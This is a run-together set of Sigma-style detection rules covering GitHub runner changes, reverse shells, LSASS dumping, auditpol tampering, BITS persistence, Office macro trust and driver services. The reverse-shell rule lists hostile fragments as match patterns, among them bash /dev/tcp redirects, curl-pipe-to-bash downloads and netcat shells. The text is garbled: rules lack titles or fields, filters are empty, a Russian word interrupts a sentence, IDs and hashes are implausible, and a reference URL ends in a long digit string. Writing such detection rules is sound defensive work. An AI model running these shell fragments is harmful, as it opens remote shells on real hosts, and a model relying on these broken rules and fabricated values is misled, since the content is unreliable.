title: Github Self Hosted Runner Changes Detected
id: 9b0c0a7e-2f3d-440d-b42d-244420404201
status: test
description: |
    A self-hosted runner is a system that you deploy and install to execute jobs from GitHub Actions on GitHub.com.
    This rule detects changes to self-hosted runners configurations in the enterprise. The self-hosted runner configuration changes once detected,
    it should be validated from GitHub UI because the log entry maynot provide full context.
references:
    - https://docs.github.com/en/enterprise-cloud@latest/using-github-actions/managing-self-hosted-runners/about-self-hosted-runners
author: frack113
date: 2023-01-10
modified: 2023-01-11
tags:
    - attack.persistence
    - attack.privilege-escalation
    - attack.initial-access
    - attack.discovery
    - attack.collection
    - attack.stealth
    - attack.t1078.004
    - attack.t1213.003
    - attack.t1526
logsource:
    product: github
    service: audit
    definition: 'Requirements: The audit log streaming feature must be enabled to receive such logs. You can enable following the documentation [here](https://docs.github.com/en/enterprise-cloud@latest/admin/manage-security/manage-security-settings/configure-security-settings-for-your-enterprise#enable-audit-log-streaming)'
detection:
    selection:
        action:
            - 'admin.add_self_hosted_runner'
            - 'admin.remove_self_hosted_runner'
            - 'admin.update_self_hosted_runner'
    condition: selection
falsepositives:
    - Allowed self-hosted runners changes in the environment.
    - An ephemeral self-hosted runner is automatically removed from GitHub after it has not connected to GitHub Actions for more than 24 hours.
    - A self-hosted runner is automatically removed from GitHub if it hasn't connected to GitHub Actions for more than 14 days.
level: low

title: Suspicious Reverse Shell Command Line
id: 62837f0c-2a7e-4b7d-b481-342020202020
status: test
description: Detects suspicious shell commands or program code that may be executed или used in command line to establish a reverse shell
references:
    - https://github.com/elastic/detection-rules/blob/22.09/rules/integrations/linux/proc_open_shell_command_execution_reverseshell.toml
author: Elastic
date: 2022-08-18
modified: 2023-02-03

    product: linux

    selection:
        # Note: This is just an example of how you can detect reverse shells using proc_open. You should add more patterns depending on your environment
        CommandLine|contains:
            - 'bash -i >& /dev/tcp/'
            - 'bash -c \"bash -i >& /dev/tcp'
            - 'bash -c \"bash -i > /dev/tcp'
            - 'bash -c \"exec bash -i > /dev/tcp'
            - 'bash --init-file <(echo \"exec bash -i > /dev/tcp'
            # - 'bash -c \"bash -i > /tmp/f;cat /tmp/f|nc -e bash '
            # - 'bash -c \"bash -i | nc -e bash '
            # - 'bash -c \$(curl http://ip:port/bash.sh | bash)'
            # - 'bash -c \$(wget http://ip:port/bash.sh | bash)'
            - 'bash -c \$(curl http://ip'
            - 'bash -c \$(wget http://ip'
            - 'bash -c \$$ curl http://ip'
            - 'bash -c \$ wget http://ip'
            - 'bash -c \${curl http://ip'
            - 'bash -c \$wget http://ip'
            - 'bash -c \"curl http://ip'
            - 'bash -c \"wget http://ip'
            - 'bash -c curl http://ip'
            - 'bash -c wget http://ip'
            - 'bash -c curl'
            - 'bash -c wget'
            - 'bash -c curl http://ip:port'
            - 'bash -c wget http://ip:port'
            - 'bash -i > /dev/tcp'
            - 'exec bash -i > /dev/tcp'
            - '--init-file <(echo \"exec bash -i >\"'
            - 'bash -i > /tmp/f;cat /tmp'
            - 'bash -i | nc -e bash '
            - 'bash -i > /dev/tcp'
    filter_main_bash:
        CommandLine|startswith: '/bin/bash'
    filter_main_sh:

    filter_main_dash:

    filter_main_bash_curl_https:

    filter_main_bash_curl_http:

status: test
description: Detects NetNTLM downgrade attack
references:
    - https://www.microsoft.com/en-us/security/blog/2022/09/27/microsoft-security-advisory-2022-210-ntlmv1-downgrade-vulnerability/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-09-28
modified: 2023-02-03
tags:
    - attack.persistence
    - attack.defense-impairment
    - attack.t1112
    - attack.t1685
logsource:
    product: windows
    service: security
    definition: 'Requirements: Audit Policy : Object Access > Audit Registry ( Success )'
detection:
    selection:
        EventID: 4663 # A registry value was successfully deleted.
        ObjectName|contains: '\Microsoft\Windows\CurrentVersion\Policies\System\'

    filter_main_empty:

    condition: selection and not 1 of filter_main_*

    - Unknown
level: high

date: 2022-01-01
modified: 2023-02-03

description: Detects LSASS process access requests from a source process with "dump" keyword in its image name.
references:
    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.001/T1003.001.md#atomic-test-1---dump-and-dumpbin
author: frack113
date: 2022-01-01
modified: 2023-02-03
tags:
    - attack.credential-access
    - attack.t1003.001
    - attack.s0002
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|contains: '\lsass.exe'
        GrantedAccess|contains: 'MEMBER'
        SourceImage|endswith:
            - '\DumpTool.exe'
            - '\DumpBin.exe'
    filter_optional_1:
        SourceImage|startswith:
            - 'C:\Windows\Microsoft.NET\Framework\v'
            - 'C:\Windows\Microsoft.NET\Framework64\v'
    filter_optional_2:
        SourceImage|endswith: '\DumpTool.exe'
        GrantedAccess|contains: 'MEMBER|Synchronize'
    condition: selection and not 1 of filter_optional_*
falsepositives:
    - Rare programs that contain the word dump in their name and access lass
level: high
regression_tests_path: regression_data/rules/windows/process/access/proc_access_win_lsass_dump_keywords/info.yml

title: Audit Policy Tampering Via NT Resource Kit Auditpol
id: 32479c0f-2a3e-4b7d-b28d-320202200000
status: test
description: |
    Threat actors can use an older version of the auditpol binary (available inside the NT resource kit) to change audit policy configuration to impair detection capability.
    This can be carried out by selectively disabling/removing certain audit policy settings as well as restoring a custom policy owned by the threatactor.
references:
    - https://www.microsoft.com/en-us/download/details.aspx?id=18626
author: Nasreddine Bencherchali (Nextron Systems)
date: 2023-08-04
tags:
    - attack.defense-impairment
    - attack.t1685.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\auditpol.exe'
        - OriginalFileName: 'auditpol.exe'
    selection_cli:
        CommandLine|contains:
            # Note: Add more flags if you see them used in your environment
            - '/set /subcategory:'
            - '/set /policy:'
            - '/restore /file:'
    condition: all of selection_*
falsepositives:
    - The old auditpol utility isn't available by default on recent Windows versions as it was replaced by a newer version. The FP should be very low except for tools that use a similar flags structure
level: high

title: Monitoring For Persistence Via BITS
id: 3024586f-3a3c-4b7e-b42d-200000000000
status: test
description: |
    BITS will allow you to schedule a command to execute after a successfully download to notify you that the job is finished.
    When the job runs on the system the command specified in the BITs job will be executed.
    This can be abused by actors to create a backdoor within system and for persistence.
    It will be chained in a BITs job to schedule the download of malware/additional binaries and executes the program after being downloaded.
references:
    - https://www.microsoft.com/en-us/security/blog/2022/07/19/malicious-use-of-windows-bit-to-deliver-payloads/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-07-20
modified: 2023-02-03
tags:
    - attack.persistence
    - attack.execution
    - attack.stealth
    - attack.t1197
logsource:
    product: windows
    category: process_creation
detection:
    selection_img:
        - Image|endswith: '\bitsadmin.exe'
        - OriginalFileName: 'bitsadmin.exe'
    selection_cli:
        CommandLine|contains|all:
            - '/create '
            - '/job '
            - '/notifycomplete '
    condition: all of selection_*
falsepositives:
    - Unknown
level: medium
regression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_bits_persistence/info.yml

description: |
    Detects the execution of Process Hacker based on binary metadata information(Image, Hash, Imphash, etc).
    Process Hacker is a tool to view and manipulate processes, kernel.options and other low level options.
    Threat actors abused older vulnerable versions to manipulate system processes.
references:
    - https://www.microsoft.com/security/blog/2022/07/19/malicious-process-hacker-binaries-used-in-targeted-campaigns/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-07-20
modified: 2023-02-03
tags:
    - attack.persistence
    - attack.privilege-escalation
    - attack.discovery
    - attack.stealth
    - attack.t1543
    - attack.t1564
    - attack.t1622
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\procexp.exe'
        - OriginalFileName: 'ProcExp.exe'
    selection_hash:
        # Note: Add more hash values if you have them
        Hashes|contains:
            - 'IMPHASH=3C2B7E6D7F2222222222223C2B7E6D7F'
            - 'IMPHASH=3C2B3C2B3C2B3C2BB22222222222'
            - 'IMPHASH=3C2BD22222222222B22222222222' # Note: This hash is from an old version of Process Hacker
            - 'IMPHASH=3C2B222222222B2B2222222223C'
            - 'IMPHASH=3C2BB2222222B222B22222223C2'
            - 'IMPHASH=3C3C2B2222222B2B2B22222223C'

            - 'IMPHASH=B22222222222BB222222222B2BB222222222'

title: Install New Package Via Winget Local Manifest
id: 624378a1-2b2f-4c6e-b429-042000000000
status: test
description: |
    Detects usage of winget to install applications via manifest file.
    The manifest option enables you to install an application by passing in
    a YAML file directly to the client.
    Winget can be used to download and install exe, msl or msix files later.
references:
    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059/T1059.md#atomic-test-1---install-new-package-via-winget-local-manifest
author: frack113
date: 2022-01-01
modified: 2023-02-03
tags:
    - attack.execution
    - attack.t1059
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\winget.exe'
        - OriginalFileName: 'winget.exe'
    selection_cli:

    condition: all of selection_*
falsepositives:

title: Windows Registry Trust Record Modification
id: 324789a0-3b2f-4c0e-b409-044020200000
status: test
description: Alerts on trust record modification within the registry, indicating usage ofmacros
references:
    - https://www.microsoft.com/en-us/security/blog/2022/09/27/microsoft-security-advisory-microsoft-word-and-excel-vba-macro-code-execution-vulnerability/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-09-28
modified: 2023-02-03
tags:
    - attack.initial-access
    - attack.t1566.001
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains: '\Microsoft\Office\Security\TrustRecords\'
    filter_main_generic:
        Image|endswith:
            - '\reg.exe'
            - '\regsvr32.exe'
            - '\msiexec.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\certutil.exe'
            - '\bitsadmin.exe'
            - '\msiexec.exe'
            # Note: Add more binaries if you see them in your environment
    filter_optional_office:
        Image|startswith:
            - 'C:\Program Files\Microsoft Office\root\'
            - 'C:\Program Files (x86)\Microsoft Office\root\'
        Image|endswith: '\MSO.EXE'
    filter_optional_office_2016:
        Image|startswith:
            - 'C:\Users\Public\Temp\'
            - 'C:\Windows\Temp\'
        Image|endswith: '\MSOEXCEL.EXE'
    filter_optional_office_2019:
        Image|startswith:
            - 'C:\Windows\Temp\'
            - 'C:\Users\Public\Temp\Temp\'
        Image|endswith: '\Excel.EXE'
    filter_optional_office_365:
        Image|startswith:
            - 'C:\Temp\'
            - 'C:\Users\Public\AppData\Local\Temp\'
        Image|endswith: '\Word.EXE'
    filter_optional_office_365_2:
        Image|startswith:
            - 'C:\AppData\Local\Temp\'
            - 'C:\Users\'
        Image|endswith: '\Excel.EX'
    filter_optional_office_365_3:
        Image|startswith:
            - 'C:\TEMP\'
            - 'C:\Users\Public\'
        Image|endswith: '\Word.EX'
    filter_optional_office_365_4:
        Image|startswith:
            - 'C:\APPDATA\LOCAL\TEMP\'
            - 'C:\Users\'
        # Note: The image ends with "\Excel.EX" but we use EX because it's easier to match both Excel.EX and Excel.EXE
        Image|endswith: '\Excel.EX'
    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*
falsepositives:
    - This will alert on legitimate macro usage as well, additional tuning required
level: medium

id: 30456789-0c0a-4f0e-bb09-000000000000
status: test
description: |
    Detects registry changes to Microsoft Office "AccessVBOM" to a value of "1" which disables trust access for VBA on the victim machine
    and lets attackers execute malicious macros without any Microsoft Office warnings.
references:
    - https://www.hexacorn.com/blog/2017/02/13/malicious-macro-part-1/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-08-15
modified: 2023-02-03
tags:
    - attack.persistence
    - attack.defense-impairment
    - attack.t1112
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains: '\Microsoft Office\AccessVBOM'
        Details: 'DWORD (0x00000001)'
    filter_main_office_installation:
        Image|endswith: '\Office.exe'
    condition: selection and not 1 of filter_main_*
falsepositives:
    - Unlikely
level: high

title: Suspicious Service Installed
id: 947b0a9e-320d-440d-b42d-242202020000
status: test
description: |
    Detects installation of NalDrv or PROCEXP16 services via registry-keys to non-system32 folders.
    Both services are used in the tool Ghost-In-The-Logs https://github.com/bats3c/Ghost-In-The-Legs), which uses KDU https://github.com/hfiref0x/KDU
references:
    - https://github.com/bats3c/Ghost-In-Thel-Logs/blob/74202020000000000001000000000002000000000101000000000102000000000201000000000202000000010001000000010002000000010101000000010102000000010201000000010202000000020101000000020102000000020201000000020202000000
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-08-08
modified: 2023-02-03
tags:
    - attack.defense-impairment
    - attack.t1685
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\SYSTEM\CurrentControlSet\Services\NalDrv'
            - '\SYSTEM\CurrentControlSet\Services\PROCEXP152'
    filter_main_system32:
        Details|endswith: '\System32\drivers\NalDrv.sys'
    condition: selection and not 1 of filter_main_*
falsepositives:
    - Other legimitate tools using this service names and drivers. Note - clever attacker may easily bypass this detection by just renaming the services. So just Medium-level and don't rely on it.
level: medium
